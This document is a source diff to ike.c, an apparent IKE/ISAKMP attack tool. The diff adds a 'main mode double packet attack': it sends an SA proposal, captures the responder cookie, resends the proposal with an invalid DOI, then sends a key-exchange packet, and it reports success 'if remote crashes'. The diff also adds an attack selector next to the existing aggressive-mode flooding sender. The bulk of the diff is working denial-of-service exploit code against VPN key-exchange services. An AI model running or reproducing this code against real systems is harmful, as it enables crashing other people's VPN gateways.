@@ -2,7 +2,7 @@
 
   ike.c 
 
-  Copyright (c) 2001 Pekka Riikonen, priikone@silcnet.org.
+  Copyright (c) 2001, 2008 Pekka Riikonen, priikone@silcnet.org.
 
   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
@@ -39,12 +39,15 @@
 #include <arpa/inet.h>
 #include <time.h>
 #endif
+
+#include "ike.h"
+
 /* ISAKMP payload params */
 
 /* IKE version used */
 unsigned char version = 0x10;
 
-/* Idnetity Protection mode is Aggressive */
+/* Idnetity Protection mode */
 unsigned char a_mode = 0x04;
 unsigned char m_mode = 0x02;
 
@@ -59,6 +62,7 @@ unsigned char message_id[4] = { 0x00, 0x00, 0x00, 0x00 };
 
 /* DOI used (IPSEC) */
 unsigned char doi[4] = { 0x00, 0x00, 0x00, 0x01 };
+unsigned char doi_bad[4] = { 0x00, 0x00, 0x00, 0x02 };
 
 /* Situation used */
 unsigned char sit[4] = { 0x00, 0x00, 0x00, 0x01 };
@@ -119,6 +123,8 @@ struct NegotiationStruct {
   unsigned char rcookie[8];
   unsigned char *s1_packet;
   unsigned char *s2_packet;
+  int s1_len;
+  int s2_len;
   int dest_sock;
   struct sockaddr_in dest;
   int flood;
@@ -155,7 +161,6 @@ static int ike_send(Negotiation neg, unsigned char *data,
 		(struct sockaddr *)&neg->dest, len);
 }
 
-#if 0
 /* Receive data (blocks) */
 
 static int ike_recv(Negotiation neg, unsigned char *data,
@@ -163,11 +168,11 @@ static int ike_recv(Negotiation neg, unsigned char *data,
 {
   int len = sizeof(neg->dest);
   return recvfrom(neg->ike->listener, data, data_len, 0, 
-		  (struct sockaddr *)&neg->dest, &len);
+		  (struct sockaddr *)&neg->dest, (socklen_t *)&len);
 }
-#endif
 
-/* Send our intiation (first packet) to the responder */
+/* Send our intiation (first packet) to the responder.  Used for aggressive
+   mode attack only */
 
 static void ike_send_s1(Negotiation neg)
 {
@@ -178,7 +183,7 @@ static void ike_send_s1(Negotiation neg)
 
   /* Construct our first packet */
 
-  data_len = (isakmp_len + sa_len + proposal_len + transform_len + 
+  neg->s1_len = data_len = (isakmp_len + sa_len + proposal_len + transform_len + 
 	      ke_len + nonce_len + id_len);
   cp = neg->s1_packet = calloc(data_len, sizeof(*neg->s1_packet));
 
@@ -232,8 +237,10 @@ static void ike_send_s1(Negotiation neg)
   len += sizeof(hash);
   memcpy(cp + len, auth, sizeof(auth));	/* Auth method */
   len += sizeof(auth);
-  if (neg->auth)
-    cp[len - 1] = neg->auth;
+  if (neg->auth) {
+    cp[len - 1] = neg->auth & 0xff;
+    cp[len - 2] = neg->auth >> 8 & 0xff;
+  }
   memcpy(cp + len, grp, sizeof(grp)); /* Group */
   len += sizeof(grp);
   if (neg->group)
@@ -282,7 +289,7 @@ static void ike_send_s1(Negotiation neg)
   i = 0;
   while(1) {
     neg->s1_packet[7] = i + rand();
-    ike_send(neg, neg->s1_packet, data_len);
+    ike_send(neg, neg->s1_packet, neg->s1_len);
     fprintf(stderr, "%10d\b\b\b\b\b\b\b\b\b\b", i + 1);
     i++;
     if (!neg->flood)
@@ -290,6 +297,143 @@ static void ike_send_s1(Negotiation neg)
   }
 
   fprintf(stdout, "Done.\n");
+  exit(1);
+}
+
+/* Main mode double packet attack. */
+
+static void ike_send_mm(Negotiation neg)
+{
+  unsigned int data_len, len = 0;
+  unsigned char *cp, reply[4096];
+  unsigned char *d = doi;
+
+  /* First packet */
+ again:
+  neg->s1_len = data_len = (isakmp_len + sa_len + proposal_len + transform_len);
+  cp = neg->s1_packet = calloc(data_len, sizeof(*neg->s1_packet));
+
+  /* ISAKMP header */
+  memcpy(cp + len, neg->icookie, sizeof(neg->icookie));
+  len += sizeof(neg->icookie);
+  memcpy(cp + len, neg->rcookie, sizeof(neg->rcookie));
+  len += sizeof(neg->rcookie);
+  cp[len++] = 0x01;		      /* SA */
+  cp[len++] = version;		      /* Version */
+  cp[len++] = m_mode;		      /* Main mode */
+  cp[len++] = flags;		      /* Flags */
+  memcpy(cp + len, message_id, sizeof(message_id)); /* Message id */
+  len += sizeof(message_id);
+  PUT_32(cp + len, data_len);	      /* length */
+  len += 4;
+
+  /* SA Payload */
+  cp[len++] = 0x00;		      /* NONE */
+  len++;			      /* RESERVED */
+  PUT_16(cp + len, (sa_len + proposal_len + transform_len));
+  len += 2;
+  memcpy(cp + len, d, sizeof(doi)); /* DOI */
+  len += sizeof(doi);
+  memcpy(cp + len, sit, sizeof(sit)); /* SIT */
+  len += sizeof(sit);
+
+  /* Proposal payload */
+  cp[len++] = 0x00;		      /* NONE */
+  len++;			      /* RESERVED */
+  PUT_16(cp + len, (proposal_len + transform_len));
+  len += 2;
+  cp[len++] = 0x00;		      /* Proposal number */
+  cp[len++] = 0x01;		      /* Protocol ID */
+  cp[len++] = 0x08;		      /* SPI size */
+  cp[len++] = n_tranforms;     	      /* Number of transforms */
+  memcpy(cp + len, neg->icookie, sizeof(neg->icookie));	/* SPI */
+  len += sizeof(neg->icookie);
+
+  /* Transform payload */
+  cp[len++] = 0x00;		      /* NONE */
+  len++;			      /* RESERVED */
+  PUT_16(cp + len, transform_len);    /* Length */
+  len += 2;
+  cp[len++] = 0x00;		      /* Transform number */
+  cp[len++] = transform_id;	      /* Transform ID */
+  len += 2;			      /* RESERVED */
+  memcpy(cp + len, enc, sizeof(enc)); /* ENC */
+  len += sizeof(enc);
+  memcpy(cp + len, hash, sizeof(hash));	/* Hash */
+  len += sizeof(hash);
+  memcpy(cp + len, auth, sizeof(auth));	/* Auth method */
+  len += sizeof(auth);
+  if (neg->auth) {
+    cp[len - 1] = neg->auth & 0xff;
+    cp[len - 2] = neg->auth >> 8 & 0xff;
+  }
+  memcpy(cp + len, grp, sizeof(grp)); /* Group */
+  len += sizeof(grp);
+  if (neg->group)
+    cp[len - 1] = neg->group;
+  memcpy(cp + len, life_type, sizeof(life_type)); /* Life type */
+  len += sizeof(life_type);
+  memcpy(cp + len, life, sizeof(life));	/* Life */
+  len += sizeof(life);
+
+  len = 0;
+  if (d == doi) {
+    printf("Send first packet\n");
+    ike_send(neg, neg->s1_packet, neg->s1_len);
+
+    /* Wait for reply, take cookie from reply, modify DOI and
+       resend the same packet. */
+    data_len = ike_recv(neg, reply, sizeof(reply));
+    printf("Received %d bytes in reply\n", data_len);
+    memcpy(neg->rcookie, reply + sizeof(neg->icookie), sizeof(neg->rcookie));
+
+    /* Update bad DOI */
+    d = doi_bad;
+    goto again;
+  } else {
+    printf("Send first packet again\n");
+    ike_send(neg, neg->s1_packet, neg->s1_len);
+  }
+
+  /* Second packet */
+
+  neg->s2_len = data_len = (isakmp_len + ke_len + nonce_len);
+  cp = neg->s2_packet = calloc(data_len, sizeof(*neg->s2_packet));
+
+  /* ISAKMP header */
+  memcpy(cp + len, neg->icookie, sizeof(neg->icookie));
+  len += sizeof(neg->icookie);
+  memcpy(cp + len, neg->rcookie, sizeof(neg->rcookie));
+  len += sizeof(neg->rcookie);
+  cp[len++] = 0x04;		      /* KE */
+  cp[len++] = version;		      /* Version */
+  cp[len++] = m_mode;		      /* Main mode */
+  cp[len++] = flags;		      /* Flags */
+  memcpy(cp + len, message_id, sizeof(message_id)); /* Message id */
+  len += sizeof(message_id);
+  PUT_32(cp + len, data_len);	      /* length */
+  len += 4;
+
+  /* KE payload */
+  cp[len++] = 0x0a;		      /* Nonce */
+  len++;			      /* RESERVED */
+  PUT_16(cp + len, ke_len);
+  len += 2;
+  memcpy(cp + len, neg->ike->data, 128);
+  len += 128;
+  
+  /* Nonce payload */
+  cp[len++] = 0x00;		      /* NONE */
+  len++;			      /* RESERVED */
+  PUT_16(cp + len, nonce_len);
+  len += 2;
+  memcpy(cp + len, neg->ike->data, 16);
+  len += 16;
+  
+  printf("Send second packet\n");
+  ike_send(neg, neg->s2_packet, neg->s2_len);
+
+  fprintf(stdout, "Done.  Attack is successful if remote crashes.\n");
   exit(1);
 }
 
@@ -340,7 +484,7 @@ void *ike_start(void)
    its own after negotiation is finished. */
 
 void ike_add(void *context, int sock, struct sockaddr_in *dest,
-	     int flood, char *identity, int group, int auth)
+	     int flood, char *identity, int group, int auth, int attack)
 {
   Ike ike = (Ike)context;
   Negotiation neg;
@@ -379,5 +523,17 @@ void ike_add(void *context, int sock, struct sockaddr_in *dest,
     neg->icookie[i] = 1 + (int) (255.0 * rand() / (RAND_MAX + 1.0));
 
   /* Start IKE negotiation */
-  ike_send_s1(neg);
+  switch (attack) {
+    case IKE_ATTACK_AGGR:
+      ike_send_s1(neg);
+      break;
+
+    case IKE_ATTACK_MM:
+      ike_send_mm(neg);
+      break;
+
+    default:
+      return;
+      break;
+  }
 }
